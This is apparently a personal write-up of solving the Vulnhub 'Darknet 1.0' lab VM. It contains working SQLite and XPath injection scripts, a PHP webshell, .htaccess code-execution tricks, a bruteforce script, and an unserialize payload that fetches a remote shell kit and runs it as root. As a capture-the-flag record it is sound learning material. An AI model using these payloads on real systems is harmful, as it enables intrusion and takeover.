Vulnhub Darknet1.0 write up
###########################

:title: Vulnhub Darknet1.0 write up
:date: 2015-06-08T00
:modified: 2015-07-08 18
:tags:


[Darknet 1.0](https://www.vulnhub.com/entry/darknet-10,120/) by `q3rv0 <https://www.vulnhub.com/author/q3rv0,111/>`_
isn't easy... for me anyway.

With some help and lots of reading I did however get to the bottom of it.

Here's my journey

Stage 1
=======

First things first: scan the target

.. code:: console

	root@kali:~# nmap -sV -p- 192.168.56.106
	
	Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST
	Nmap scan report for darknet.com (192.168.56.106)
	Host is up (0.00017s latency).
	Not shown: 65532 closed ports
	PORT      STATE SERVICE VERSION
	80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
	111/tcp   open  rpcbind 2-4 (RPC #100000)
	57664/tcp open  status  1 (RPC #100024)
	MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)
	
	Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 20.86 second

Not much to be had here other than a web server. Poking at the RPC ports
didn't give any results. Browsing to the IP shows me:

.. image:: http://i.imgur.com/b513tfj.png


There's no :code:`robots.txt` so nothing left to do but run :code:`dirbuster` on it. Using the
:code:`directory-list-2.3-medium.txt` I'm rewarded with some directories and files that
might be of interest

.. image:: http://i.imgur.com/dNQnSQy.png


I downloaded the :code:`888.darknet.com.backup` file and took a look at it.

.. code:: text

	<VirtualHost *:80>
	    ServerName 888.darknet.com
	    ServerAdmin devnull@darknet.com
	    DocumentRoot /home/devnull/public_html
	    ErrorLog /home/devnull/logs
	</VirtualHost>

Hrmm.. a virtual host configuration. I added :code:`192.168.56.106 888.darknet.com` to my local :code:`/etc/hosts` 
and then pointed my browser to :code:`888.darknet.com` to be presented with this:

.. image:: http://i.imgur.com/PcMHBLd.png


Initial thoughts are SQLi, so  I started with some simple SQL injections to see 
if my hunch is correct. Entering a username like :code:`' or '1'='1` 
yields an *Ilegal*\ [sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn't fancy working out
what chars I can and can't use so I made a script to do that for me

.. code:: python

	#!/usr/bin/python
	
	import requests
	import string
	import re
	
	def testit(c):
	    url = 'http://888.darknet.com/index.php'
	    payload = 'username=%s&password=%s&Action=Login' % (c, c)
	
	    r = requests.post(url, data=payload)
	    m = re.search('.*Ilegal.*', r.text)
	    if m:
	        print '%s\tIllegal' % c
	    else:
	        print '%s\t OK' % c
	
	for c in string.punctuation:
	    testit(c)
	

which yielded the following as illegal characters.

.. code:: text

	,	Illegal
	-	Illegal
	;	Illegal
	<	Illegal
	=	Illegal
	>	Illegal

everything else was fair game. Well almost everything, some SQL commands aren't
allowed either. But I've got enough to work with. 
I have a good idea that :code:`devnull` is a valid user, so I'll try to use that 
info. I enter :code:`devnull'/*` as a username hoping I am creating a query like
:code:`SELECT * FROM users WHERE username='devnull'/* AND password='xxxx';`. Hitting
the login button confirms my input is correct.

I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to :code:`index.php`.  Noticed this in Burp as it
was redirection to :code:`main.php` after the correct SQLi, but then
going back to :code:`index.php`. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.

Ok, so now I get 

Stage 2
=======

.. image:: http://i.imgur.com/joaBvqT.png


Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.

While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter :code:`'` for the username with any pass:
:code:`unrecognized token: "3590cb8af0bbb9e78c343b52b93773c9"`. This is the md5 of the password.
Using a number like :code:`1` for the password with :code:`'` as the username gives 
this error :code:`near "c4ca4238a0b923820dcc509a6f75849b": syntax error`
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.

One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to. 
I ran :code:`dirbuster` again and now have a few directories to try

.. image:: http://i.imgur.com/zlFz06Y.png


In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this

.. code:: text

	attach database '/home/devnull/public_html/test.php' as db;                
	drop table if exists db.test;                                                    
	create table db.test(payload text);                                              
	insert into db.test(payload) values('<?php phpinfo(); ?>');

From the Apache config I downloaded at the start, I know that the webroot is :code:`/home/devnull/public_html`,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the :code:`img` directory. So I've got a place to 
create files, but the bad news is that :code:`exec`, :code:`eval`, and its ilk are disabled.
This means no simple php shell. Boooo.

Not to worry, I got this. I knocked up a quick PHP script to do some work for me

.. code:: php

	if ($_GET["cmd"] == "db") {                                                     
	    $dbhandler=new SQLite3("/home/devnull/database/888-darknet.db");            
	                                                                                
	    $query = $dbhandler->query("SELECT * FROM login");                          
	                                                                                
	    while($result=$query->fetchArray()){                                        
	        print_r($result);                                                       
	        print "<br/>";                                                          
	    }                                                                           
	}                                                                               
	                                                                                
	if ($_GET["cmd"] == "ls") {                                                     
	    $path = $_GET["arg"];                                                       
	    @chdir($path);                                                              
	    $dir = @dir($path);                                                         
	    while($d = $dir->read()) {                                                  
	        print $d."<br/>";                                                       
	    }                                                                           
	}                                                                               
	if ($_GET["cmd"] == "cat") {                                                    
	    $file = $_GET["arg"];                                                       
	    $fh = fopen($file, "r");                                                    
	    if ($fh) {                                                                  
	        while ($l = fgets($fh)) {                                               
	            print htmlspecialchars($l)."<br/>";                                 
	        }                                                                       
	        fclose($fh);                                                            
	    } else { print "Cannot open ".$file."<br/>"; }                              
	} 

I use this as the payload in the :code:`INSERT` statement.

With the :code:`cmd` parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the :code:`includes` folder.

I scoped around the server a bit, looking in the usual interesting folders, seeing if there's 
anything useful. Eventually I found something interesting in the Apache
config folder. There's another virtual host on this machine at :code:`signal8.darknet.com`. 

Before I go on, I best mention `DAws <https://github.com/dotcppfile/DAws>`_ which 
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the :code:`DAws.php` file. This
will drop a :code:`php.ini` on the server that allows you to run commands, and also create
a reverse shell to your host. **Much** easier than what I did, but you learn new things 
all the time. This will be the PHP script I'll be using going forward.

Stage 3
=======

Ok, so now I'm looking at the list of Darknet staff. Clicking on the usernames will take 
me to a php page showing me that user's email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory 
called :code:`xpanel` which prompts me for another username and password combo. 
No SQLi here though I'm afraid. I cannot bruteforce this either. Well I *could* 
but I don't think I'll get a hit any time soon.

Fastforward and I'm stuck. After chatting to *g0blin* I get a hint that the :code:`contact.php` is
a key. I start attempting to inject stuff into the :code:`id` field. Eventually I notice that I am
not looking at the same DB. The ids don't match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn't getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like :code:`...user/id=1]` Adding :code:`][1` at the end will
return the first and only result, and we should get the email as per normal. 
Adding :code:`[2` will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.

.. image:: http://i.imgur.com/7jRrIo0.png


Excellent, it worked. Now I need to figure out how to make use of this. XPath isn't
something I've come across very often.

So I begin to experiment. First off I figured out if it's XPath V2 or XPath V1.
If entering :code:`id=1 or count(//*)][1` doesn't work, but :code:`id=1 lower-case('A')][1` does,
then it's XPath V2, otherwise it's XPath V1.

While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the :code:`substring` function. I wrote another python
script to do the heavy lifting

.. code:: python

	import requests
	import string
	import sys
	
	
	path = ''
	if len(sys.argv) > 1:
	    path = sys.argv[1]
	
	URL = 'http://signal8.darknet.com/contact.php'
	payload_tpl = "1 and substring(name(%s),%d,1)='%s'][1"
	
	name = ''
	cmp_pos = 1
	carry_on = True
	
	while carry_on:
	
	    carry_on = False
	    print name
	    for c in string.ascii_letters:
	        payload = {'id': payload_tpl % (path,cmp_pos,c)}
	
	        r = requests.get(URL, params=payload)
	        if r.text.find('errorlevel') != -1:
	            name += c
	            carry_on = True
	            break
	
	    cmp_pos += 1
	
	print 'Path name:', name

So I ran this with the current path

.. code:: console

	root@kali:~/darknet# python xpath.py 
	u
	us
	use
	user
	Path name: user

and the parent path

.. code:: console

	root@kali:~/darknet# python xpath.py ..
	a
	au
	aut
	auth
	Path name: auth

Ok, that will help me get some more data from the file. I try to see if the
email field will work with :code:`1]/email|auth[id=1`. I need the :code:`auth` part because
without it the query will not close correctly in the main script, and this
makes sure the closing :code:`]` won't error.

So now I should be able to get the username with :code:`1]/username|auth[id=1`. 
Now let's try the password field. I tried :code:`pass` and :code:`password` before I realised we're dealing with another
language here. Thanks to the logins I know that the spanish for password is *clave*.
:code:`id=1]/clave|auth[id=1` throws up the password! Result. Using these detail
I am able to login at :code:`signal8.darknet.com/xpanel`

Stage 4
=======

.. image:: http://i.imgur.com/TVG7WhQ.png


Oooh a PHP editor! Sweet... yeah right. Clicking the link goes to a page that shows:

.. code:: text

	Tr0ll Found
	
	The requested URL /xpath/xpanel/edit.php was not found on this server.

So after some manual digging nothing comes up. Time to break out :code:`dirbuster` again
to find :code:`ploy.php` which presents me with

.. image:: http://i.imgur.com/DueLt5z.png


It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I'll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.

Here's my bruteforce script:

.. code:: python

	import sys
	import requests
	import itertools
	
	user = 'devnull'
	passwd = 'j4tC1P9aqmY'
	
	base_url = 'http://signal8.darknet.com/xpanel/'
	
	login_url = base_url + 'index.php'
	payload = {'username': user, 'password': passwd}
	
	sess = requests.session()
	
	r = sess.post(login_url, data=payload)
	
	ploy_url = base_url + 'ploy.php'
	
	for attempt in itertools.permutations(["37","58","22","12","72","10","59","17","99"], 4):
	    payload = {'Action':'Upload',
	               'checkbox[]': attempt
	
	              }
	
	    files = {'imag':('info.txt', open('info.php', 'rb')}
	
	    r = sess.post(ploy_url, data=payload, files=files)
	
	    if r.text.find('Key incorrecta!') == -1:
	        print 'Found pin: ', attempt
	        sys.exit(0)

The correct PIN is :code:`'37', '10', '59', '17'`. I tried to upload a PHP script, but
that won't work. Seems uploading anything with a :code:`php` extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site :code:`AllowOverride All` is on. Most likely going to be something to 
do with :code:`.htaccess`. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404

.. code:: text

	Order deny,allow
	Allow from all
	ErrorDocument 404 https://google.com
	

This should direct me to :code:`google.com`, which it does, indicating :code:`.htaccess` overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?

Unfortunately there's another issue: as I upload files, old files seem to get deleted. 
I found this out when the 404 redirect stopped working after uploading an html file.

Luckily I discovered that it's possible to execute php code inside the .htaccess file.

.. code:: text

	AddHandler application/x-httpd-php .htaccess                                    
	DirectoryIndex .htaccess                                                        
	<FilesMatch "^\.htaccess">                                                      
	Order deny,allow                                                                
	Allow from all                                                                  
	SetHandler application/x-httpd-php                                              
	</FilesMatch>                                                                   
	                                                                                
	#<?php print $_GET["test"]; ?> 

Sure enough the :code:`$_GET["test"]` variable is on the page. So this should allow me 
to get a run some useful code on there somehow.

After following some blind leads, I wrote a php script that would take a file encoded 
with base64 and a filename via a :code:`POST` method and write this file out.
(Note: appending the entire script for DAws or similar didn't work).
Something like this should work though:

.. code:: php

	$fp = fopen($_POST['name'], 'wb'); 
	fwrite($fp, base64_decode($_POST['data'])); 
	fclose($fp);

At the end of the :code:`.htaccess` file. However this always error with a permissions
error.

After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It's :code:`suphp` not :code:`php`,
so I wasn't executing the script as the :code:`errorlevel` user. Derp.

More info on `suphp <http://suphp.org/Home.html>`_

Stage 5
=======

So having sorted that I uploaded :code:`DAws` and got myself a reverse shell and explored
once more. Now inside :code:`/var/www` there's some files I missed earlier: :code:`sec.php`,
:code:`Classes/Test.php`, and :code:`Classes/Show.php`. Interesting.

Trying to hit :code:`darknet.com/sec.php` errors. Let's take a look inside of it

.. code:: php

	<?php
	
	require "Classes/Test.php";
	require "Classes/Show.php";
	
	if(!empty($_POST['test'])){
	    $d=$_POST['test'];
	    $j=unserialize($d);
	    echo $j;
	}
	?>

Rembering that we're dealing with suphp it could well be that the 500 error is
because :code:`sec.php` is trying to run as :code:`root`. Checking :code:`/etc/suphp/suphp.conf` 
my suspicion is correct, the :code:`min_uid` and :code:`min_gid` settings are too high for
:code:`root` scripts to run. But hey, as luck would have it (thanks q3rv0) :code:`suphp.conf`
is :code:`777`. So heading straight to :code:`sed`

.. code:: console

	$ sed -i 's/min_uid=100/min_uid=0/g' suphp.conf
	sed: couldn't open temporary file ./sedm2LUZQ: Permission denied

Hmph. Ok then I'll copy the :code:`suphp.conf` to :code:`/tmp` and edit it there, then copy
it back. Making sure I change both :code:`min_uid` and :code:`min_gid`, I reload :code:`sec.php` and
get a blank page. No errors are good errors.

Now that I've got :code:`sec.php` running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)

:code:`sec.php` unserialises our input, which basically takes a serialised string 
and `unserialises into an object <https://php.net/manual/en/function.unserialize.php>`_. 
Similar to Python's pickle. There's no way I can call a method on either of the classes,
so I have to see what will get called for me.
The :code:`Test` class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that's what
we're supposed to use. 

.. code:: php

	<?php
	
	class Test {
	
	    public $url;
	    public $name_file;
	    public $path;
	
	    function __destruct(){
	        $data=file_get_contents($this->url);
	        $f=fopen($this->path."/".$this->name_file, "w");
	        fwrite($f, $data);
	        fclose($f);
	        chmod($this->path."/".$this->name_file, 0644);
	}
	}
	
	?>

The :code:`Show` class on the other hand is only useful for testing, as this will provide visual
feedback when :code:`sec.php` gets rendered and runs the :code:`echo` statement. This will
invoke the :code:`__toString` method on the :code:`Show` class. Passing :code:`test=O:4:"Show":1:{s:4:"woot";s:2:"XX";}` 
will print :code:`Showme`, confirming that the serialisation worked.

Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the :code:`Test` class and
prints out the string I need. Which is

.. code:: text

	O:4:"Test":3:{s:3:"url";s:30:"http://192.168.56.101/DAws.txt";s:9:"name_file";s:8:"DAws.php";s:4:"path";s:8:"/var/www"}

Using Burp suite I use a :code:`GET` request to :code:`sec.php`, send it to :code:`Repeater` and convert
it to a :code:`POST` request with the required payload:

.. image:: http://i.imgur.com/kiutbRt.png
    :width: 500px


Then I, once again, browse to my DAws url and bind a shell to finally get:

.. code:: console

	# whoami && id
	root
	uid=0(root) gid=0(root) groups=0(root)
	# cat flag.txt
	      ___           ___           ___           ___           ___           ___           ___     
	     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
	    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
	   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
	  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
	 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
	 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
	  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
	   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
	    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
	     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 
	
	
	
	     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
	     tratando de llegar hasta aca. Eso es lo que realmente importa!.
	
	
	#Blog: www.securitysignal.org
	
	#Twitter: @SecSignal, @q3rv0

I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).

I look forward to the next one.

Note
====

As it was possible to upload a shell with the SQL Admin page, browsing to :code:`/var/www` would have
taken us directly to the end stage. All the info was there and :code:`suphp.conf` is world writeable. 
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.

